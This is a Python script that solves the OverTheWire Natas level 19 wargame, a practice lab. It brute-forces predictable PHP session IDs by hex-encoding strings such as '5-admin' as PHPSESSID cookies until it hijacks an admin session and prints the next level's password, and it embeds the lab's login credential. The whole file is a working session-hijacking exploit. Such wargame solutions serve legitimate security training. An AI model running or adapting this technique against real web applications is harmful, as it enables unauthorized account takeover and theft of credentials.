#! /usr/bin/python3
import requests
import codecs
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

GREEN = "\033[92m"
YELLOW = "\033[93m"
ENDC = "\033[0m"

url = "http://natas19.natas.labs.overthewire.org/?debug=true"
auth = HTTPBasicAuth("natas19","4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")
data = {"username":"admin","password":"A123a123"}
for i in range(1,641):
    info = '{}-admin'.format(str(i))
    cookie = codecs.encode(info.encode(),'hex')
    cookies = {'PHPSESSID':cookie.decode()}
    response = requests.post(url,data=data,auth=auth,cookies=cookies)
    soup = BeautifulSoup(response.text,"html.parser")
    output = soup.prettify()
    if("Password" in output):
        print(GREEN + "found :) session={}".format(i) + ENDC)
        print(str(soup.find('pre')).replace('<pre>','').replace('</pre>',''))
        break
    else:
        print(YELLOW + "trying {}".format(i) + ENDC)